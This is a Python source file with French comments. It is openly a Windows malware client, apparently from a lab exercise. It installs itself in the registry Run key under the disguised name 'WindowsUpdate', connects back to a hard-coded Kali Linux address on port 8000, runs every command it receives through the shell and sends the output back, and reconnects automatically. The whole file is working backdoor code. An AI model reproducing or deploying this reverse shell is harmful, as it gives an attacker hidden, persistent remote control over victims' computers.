import socket
import subprocess #bibliotheque qui nous permetra d'executer des commades systemes sur windows
import time #bibliotheque qui nous permettra de faire des delais pour se reconnecter automatiquement si la connexion est perdue
import os #bibliotheque qui nous permettra de faire des operations sur le systeme de fichier de windows
import sys #bibliotheque qui nous permettra de faire des operations sur le systeme de fichier de windows
import winreg as reg #bibliotheque qui nous permettra de faire des operations sur le registre de windows pour la persistance

#configuration de la connexion et de la persistance du malware
HOST = "192.168.191.162" #@ip kali
PORT = 8000 #port d'ecoute du serveur
PERSIST_NAME = "WindowsUpdate" #nom de la cle de registre que le systeme verra

#fonction pour la persistance du malware en utilisant la methode "registry run key" ou le code on ajoute une cle dans le registre windows lui meme
def persistence():
    try:
        if getattr(sys, 'frozen', False): #verifier si le script est compile en executable
            exe_path = sys.executable #si oui obtenir le chemin de l'executable
        else:
            exe_path = os.path.abspath(__file__) # si non obtenir le chemin du script python

        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE) #ouvrir la cle de registre "Run" qui est utilise pour lancer des programmes au demarrage de windows
        reg.SetValueEx(key, PERSIST_NAME, 0, reg.REG_SZ, sys.executable) #ajouter une nouvelle valeur a la cle de registre "Run" avec le nom de notre malware et le chemin d'execution du malware
        reg.CloseKey(key) #fermer la cle de registre
        return True
    except: 
        return False
    
def connect():
    persistence() #configurer la persistance du malware avant d'etablir la connexion avec le serveur
    while True: #boucle de connexion pour se reconnecter automatiquement si la connexion est perdue
        try: 
            s = socket.socket()  # Creation du socket client
            s.connect(("192.168.191.162", 8000)) # Connexion au serveur (Kali)
            #print("[+] Connexion etablie avec le serveur")
        
            while True: #boucle pour la reception et l'execution des commandes
                try:
                    command = s.recv(4096).decode().strip()   # Recevoir la commande envoyée par le serveur
                    if not command:
                        continue #si aucune commande n'est recu, on continue la boucle pour attendre une nouvelle commande

                    if command =='quit':
                        s.close() #si la commande "quit" est recu alors on arrete la session
                        break

                    if command.startswith("cd "): #considere les commandes qui commencent par "cd"
                        try:
                            path = command[3:].strip() #on recupere le chemin apres "cd" et on le stocke dans la variable "path"
                            os.chdir(path) #on change le repertoire de travail du processus actuel vers le chemin recu pour executer les commandes dans le nouveau repertoire
                            s.send(os.getcwd().encode()) #envoyer le nouveau repertoire de travail au serveur pour que l'attaquant puisse voir ou il se trouve dans le systeme de fichier de la cible
                        except Exception as e: #retourne une erreur si le dossier n'existe pas ou si on a pas les droits
                            s.send(str(e).encode())
                        continue

                    if command =='pwd':
                        try:
                            s.send(os.getcwd().encode())
                        except Exception as e:
                            s.send(str(e).encode())
                        continue

                    else:
                        result = subprocess.getoutput(command) # Executer la commande sur Windows
                        s.send(result.encode())  # Envoyer le resultat au serveur
                except: #si une erreur survient lors de la reception ou de l'execution des commandes, on affiche un message d'erreur et on continue la boucle pour essayer de se reconnecter
                    break 
         
        except:
            time.sleep(5) # Attendre 5 secondes avant de tenter de se reconnecter

def main():
    connect()


if __name__ == "__main__":
    main()
